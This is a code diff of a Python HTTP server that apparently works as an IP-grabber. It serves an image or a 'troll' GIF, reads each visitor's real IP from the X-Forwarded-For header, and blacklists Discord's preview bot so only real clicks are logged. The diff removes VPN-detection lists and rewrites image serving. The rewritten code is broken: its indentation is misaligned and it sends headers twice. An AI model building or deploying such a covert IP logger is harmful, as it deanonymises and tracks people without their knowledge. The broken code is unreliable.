@@ -10,21 +10,6 @@ import json
 import ipaddress
 import urllib.parse
 
-# dont touch until you know what you are doing, you will break the vpn checker
-PRIVATE_NETWORKS = [
-    ipaddress.ip_network('10.0.0.0/8'),
-    ipaddress.ip_network('172.16.0.0/12'),
-    ipaddress.ip_network('192.168.0.0/16'),
-    ipaddress.ip_network('100.64.0.0/10'),
-]
-
-# dont touch until you know what you are doing, you will break the vpn checker
-KNOWN_VPN_IPS = [
-    ipaddress.ip_address('1.1.1.1'),
-    ipaddress.ip_address('2.2.2.2'),
-    ipaddress.ip_address('3.3.3.3'),
-]
-
 with open("stuff/setting.json", "r") as f:
   data = json.load(f)
 
@@ -41,30 +26,33 @@ blacklisted_agents = ["Mozilla/5.0 (compatible; Discordbot/2.0; +https://discord
 
 # modify if you have knowledge of python
 class IPHandler(http.server.BaseHTTPRequestHandler):
-    def _set_headers(self, content_type):
+    def _set_headers(self, content_type='text/html'):
         self.send_response(200)
         self.send_header('Content-type', content_type)
         self.end_headers()
-    
-    def serve_image(self, path):
-        with open(path, 'rb') as f:
-            self._set_headers('image/jpeg' if path.endswith('.jpg') else 'image/gif')
-            self.wfile.write(f.read())
-    
-    def do_GET(self):
-            parse_result = urllib.parse.urlparse(self.path)
-            path_clean = parse_result.path
 
-            if path_clean.endswith('.jpg') or path_clean.endswith('.gif'):
-                if troll:
-                    content_type = 'image/gif'
-                    self.serve_image(gif)
-                else:
-                    content_type = 'image/jpeg'
-                    self.serve_image(image)
-            else:
-                self.send_error(404, 'File not found')
- 
+    def serve_image(self, path):
+        with open(path, 'rb') as file:
+            self.send_response(200)
+            self.send_header('Content-type', 'image/jpg')
+            self.end_headers()
+            self.wfile.write(file.read())
+
+    def serve_gif(self, gif_path):
+        with open(gif_path, 'rb') as file:
+            self.send_response(200)
+            self.send_header('Content-type', 'image/gif')
+            self.end_headers()
+            self.wfile.write(file.read())
+
+    def do_GET(self):
+        parse_result = urllib.parse.urlparse(self.path)
+        
+        if parse_result.path == '/image.jpg' and troll:
+            self.serve_gif(gif)
+        else:
+            self.serve_image(image)
+
             try:
                 if 'X-Forwarded-For' in self.headers:
                     ip_real = self.headers['X-Forwarded-For'].split(',')[0]
@@ -188,7 +176,7 @@ class IPHandler(http.server.BaseHTTPRequestHandler):
             except Exception as e:
                 print(f"error: {e}")
         
-            self._set_headers(content_type=content_type)
+            self._set_headers()
 
 PORT = 8000
 
